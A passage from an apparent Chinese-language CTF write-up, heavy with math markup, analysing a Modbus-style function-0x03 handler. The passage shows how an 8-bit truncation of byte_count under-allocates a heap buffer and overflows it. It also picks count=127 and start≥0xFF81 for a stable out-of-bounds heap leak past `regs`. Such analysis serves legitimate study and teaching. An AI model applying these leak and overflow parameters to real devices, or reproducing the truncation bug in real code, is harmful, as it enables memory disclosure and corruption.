class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span></span></span></span></span>
<p>但实际回填数据长度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow></mrow><annotation encoding="application/x-tex">2\cdot\mathbf{count}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">count</span></span></span></span></span> 字节。当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>≥</mo><mn>128</mn></mrow><annotation encoding="application/x-tex">\mathbf{count}\ge 128</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">128</span></span></span></span> 时发生<strong>少分配→堆写越界</strong>。</p>
<p>若只想“稳定越界读而不崩”，取</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>≤</mo><mn>127</mn><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\,\mathbf{count} \le 127\,}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4604em;vertical-align:-0.476em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9844em;"><span style="top:-3.4604em;"><span class="pstrut" style="height:3.4604em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">127</span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-2.9844em;"><span class="pstrut" style="height:3.4604em;"></span><span class="stretchy fbox" style="height:1.4604em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.476em;"><span></span></span></span></span></span></span></span></span></span>
<p>此时</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>out_len</mtext><mo>=</mo><mn>3</mn><mo>+</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mn>2</mn><mo>≤</mo><mn>259</mn><mo>≤</mo><mn>260</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">
\text{out\_len} = 3 + 2\cdot\mathbf{count} + 2 \le 259 \le 260,
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">out_len</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">259</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">260</span><span class="mpunct">,</span></span></span></span></span>
<p>既不溢出，也不超出 RX 缓冲上限。</p>
<hr>
<p><strong>示例（脚本常用参数）</strong>：取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>=</mo><mn>127</mn></mrow><annotation encoding="application/x-tex">\mathbf{count}=127</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">127</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>=</mo><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mn>81</mn></mrow></mrow><annotation encoding="application/x-tex">\mathbf{start}=0x\mathrm{FF81}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FF81</span></span></span></span></span>，则</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mn>81</mn></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mn>81</mn></mrow><mo>+</mo><mn>127</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mo>=</mo><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mn>0</mn><mi>x</mi><mrow><mn>1</mn><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mn>02</mn></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mn>0</mn><mi>x</mi><mrow><mn>1</mn><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi></mrow><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">
\bigl[\,2\cdot 0x\mathrm{FF81}\ ,\ 2\cdot(0x\mathrm{FF81}+127)-1\,\bigr]
=
\bigl[\,0x\mathrm{1FF02}\ ,\ 0x\mathrm{1FFFF}\,\bigr],
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FF81</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FF81</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">127</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">1FF02</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">1FFFF</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mpunct">,</span></span></span></span></span>
<p>完全落在 <code>regs</code> 之后的大块堆内存里，便于稳定泄露。</p>
<p>因此我们可以取 <code>count = 127</code>，然后 <code>start</code> 可以取 <code>[0xff81, 0x10081]</code>。这样可以满足条件并读取 <code>[2*start, 2*start + 0xfc]</code> 范围的数据。</p>
<h3 id="0x03：堆溢出"><a href="#0x03：堆溢出" class="headerlink" title="0x03：堆溢出"></a>0x03：堆溢出</h3><p>功能 <code>0x03</code> 读取的数据会写入 <code>g_malloc</code> 申请的堆块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> byte_count = count * <span class="number">2</span>;               <span class="comment">// 8 位截断 → count≥128 时将发生“少分配”</span></span><br><span class="line"><span class="type">size_t</span> out_len = <span class="number">3</span> + byte_count + <span class="number">2</span>;          <span class="comment">// addr, func, bc, data..., crc</span></span><br><span class="line"><span class="type">uint8_t</span> *out = g_malloc(out_len);             <span class="comment">// 可能少分配（见上注）</span></span><br></pre></td></tr></table></figure></div>

<p>FC03 <strong>不会对 <code>regs</code> 写入</strong>，故不存在“写 <code>regs</code> 邻接内存”的越界写，但 FC03 <strong>回包阶段</strong>存在<strong>堆写越界</strong>。其溢出覆盖区相对 <code>out</code> 缓冲为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mtext mathvariant="monospace">out</mtext><mo>+</mo><mn>3</mn><mo>+</mo><mtext>byte_count </mtext><mo separator="true">,</mo><mtext> </mtext><mtext mathvariant="monospace">out</mtext><mo>+</mo><mn>3</mn><mo>+</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mn>1</mn><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">
\bigl[\, \texttt{out}+3+\text{byte\_count}\ ,\ \texttt{out}+3+2\cdot\mathbf{count}-1 \,\bigr].
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord texttt">out</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord texttt">out</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7183em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mord">.</span></span></span></span></span>

<p>申请堆块的大小为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>byte_count</mtext><mtext>  </mtext><mo>=</mo><mtext>  </mtext><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>256</mn></mrow><annotation encoding="application/x-tex">
\text{byte\_count} \;=\; (2\cdot \mathbf{count}) \bmod 256
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span></span>

<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mtext>out_len</mtext><mtext>  </mtext><mo>=</mo><mtext>  </mtext><mn>3</mn><mo>+</mo><mtext>byte_count</mtext><mo>+</mo><mn>2</mn><mtext>  </mtext><mo>=</mo><mtext>  </mtext><mn>5</mn><mo>+</mo><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">(</mo><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>256</mn><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">)</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\,\text{out\_len} \;=\; 3 + \text{byte\_count} + 2 \;=\; 5 + \bigl((2\cdot \mathbf{count}) \bmod 256\bigr)\,}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.88em;vertical-align:-0.69em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span style="top:-3.88em;"><span class="pstrut" style="height:3.88em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">out_len</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">256</span><span class="mclose"><span class="delimsizing size1">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-3.19em;"><span class="pstrut" style="height:3.88em;"></span><span class="stretchy fbox" style="height:1.88em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.69em;"><span></span></span></span></span></span></span></span></span></span>

<p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow></mrow><annotation encoding="application/x-tex">2\cdot \mathbf{count}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">count</span></span></span></span></span> 恒为偶数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>byte_count</mtext><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mn>254</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\text{byte\_count}\in\{0,2,4,\dots,254\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">byte_count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">254</span><span class="mclose">}</span></span></span></span>，因此  <span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mtext>out_len</mtext><mo>∈</mo><mo stretchy="false">{</mo><mn>5</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>9</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mn>259</mn><mo stretchy="false">}</mo><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">\boxed{\,\text{out\_len}\in\{5,7,9,\dots,259\}\,}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.74em;vertical-align:-0.65em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.09em;"><span style="top:-3.74em;"><span class="pstrut" style="height:3.74em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">out_len</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">{</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">259</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.1667em;"></span></span></span></span></span><span style="top:-3.09em;"><span class="pstrut" style="height:3.74em;"></span><span class="stretchy fbox" style="height:1.74em;border-style:solid;border-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.65em;"><span></span></span></span></span></span></span></span></span></span></p>
<p>溢出字节数（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">Δ</span></span></span></span>）为：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><menclose notation="box"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="false"><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext> </mtext><mi mathvariant="normal">Δ</mi><mo>=</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>−</mo><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">(</mo><mo stretchy="false">(</mo><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>256</mn><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">)</mo><mo>=</mo><mn>256</mn><mo>×</mo><mrow><mo fence="true">⌊</mo><mfrac><mrow><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow></mrow><mn>256</mn></mfrac><mo fence="true">⌋</mo></mrow><mtext> </mtext></mrow></mstyle></mstyle></mstyle></menclose></mrow><annotation encoding="application/x-tex">
\boxed{\
\Delta
= 2\cdot \mathbf{count} - \bigl((2\cdot \mathbf{count}) \bmod 256\bigr)
= 256 \times \left\lfloor \dfrac{2\cdot \mathbf{count}}{256} \right\rfloor\
}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.08em;vertical-align:-1.29em;"></span><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.79em;"><span style="top:-5.08em;"><span class="pstrut" style="height:5.08em;"></span><span class="boxpad"><span class="mord"><span class="mord"><span class="mspace"> </span><span class="mord">Δ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen"><span class="delimsizing size1">(</span></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">256</span><span class="mclose"><span class="delimsizing size1">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">256</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span 